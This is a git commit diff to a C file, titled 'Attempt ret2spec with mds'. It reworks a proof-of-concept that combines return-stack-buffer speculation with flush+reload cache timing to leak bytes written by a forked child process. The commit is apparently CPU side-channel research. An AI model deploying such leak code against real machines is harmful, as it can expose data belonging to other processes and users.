0b75bf967a0d56109cae5a64a4584d944518ea4f
Thijs Raymakers <thijs@raymakers.nl>
2024-01-22 23:44:30 +0100

    Attempt ret2spec with mds

--- code/src/mds.c
+++ code/src/mds.c
@@ -8,7 +8,10 @@
 #include <signal.h>
 
 #include "asm.h"
+#include "constants.h"
 #include "flush_and_reload.h"
+#include "find_threshold.h"
+#include "ret2spec.h"
 
 int main() {
   pid_t pid = fork();
@@ -17,55 +20,46 @@ int main() {
 			asm volatile(
 				"movq %0, (%%rsp)\n"
 				"mfence\n"
-				// ::"r"(0x4847464544434241ull));
-				::"r"(0x4141414141414141ull));
+				::"r"(0xf8f7f6f5f4f3f2f1ull));
 	}
 	if (pid < 0) return 1;
 
-  // struct sigaction sa = {0};
-  // sa.sa_handler = SIG_IGN;
-  // sigaction(SIGSEGV, &sa, NULL);
-
-  const size_t PAGE_SIZE = getpagesize();
-  const size_t NR_VALUES = 256;
-
-  // Where we will read from
-  const size_t leak_size = PAGE_SIZE;
-  void* leak_buffer = mmap(NULL, leak_size*2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+  const size_t leak_size = PAGE_SIZE * VALUES_IN_BYTE;
+  void* leak_buffer = mmap(NULL,
+                        leak_size,
+                        PROT_READ,
+                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
+                        -1,
+                        0);
   assert(leak_buffer != NULL);
 
   // Where we will measure the cache times
-  const size_t reload_size = PAGE_SIZE * NR_VALUES;
+  const size_t reload_size = PAGE_SIZE * VALUES_IN_BYTE;
   void* reload_buffer = mmap(NULL,
                         reload_size,
                         PROT_READ,
-                        MAP_PRIVATE | MAP_ANONYMOUS,
+                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                         -1,
                         0);
   assert(reload_buffer != NULL);
 
-  size_t results[NR_VALUES];
-  memset(results, 0, NR_VALUES * sizeof(size_t));
+  size_t results[VALUES_IN_BYTE] = {0};
 
   // Determine a threshold for when a cache is hot or cold
-  size_t threshold = measure_in_cache_threshold_time(reload_buffer);
+  // size_t threshold = find_in_cache_threshold();
+  size_t threshold = 200;
+  assert(threshold > 0);
   printf("Threshold: %ld\n", threshold);
 
-  for (int i = 0; i < 100000; ++i) {
-    // char* leak_buffer_ptr = (char*)leak_buffer;
-      // *leak_buffer_ptr = 'A';
-
-    // Page out the leak buffer
-    int adv = madvise(leak_buffer, leak_size, MADV_DONTNEED);
-    assert(adv == 0);
-
-    flush(NR_VALUES, PAGE_SIZE, reload_buffer);
-    // clflush(leak_buffer);
-    leak_read(leak_buffer, reload_buffer);
-    reload(NR_VALUES, PAGE_SIZE, reload_buffer, results, threshold);
+  madvise(leak_buffer, PAGE_SIZE, MADV_DONTNEED);
+  for (int i = 0; i < 10000; ++i) {
+    flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
+    // mfence();
+    ret2spec(leak_buffer, reload_buffer, RSB_ENTRIES);
+    reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
   }
 
-  for (size_t i = 0; i < NR_VALUES; ++i) {
+  for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
     printf("%lx\t%ld\n", i, results[i]);
   }
 
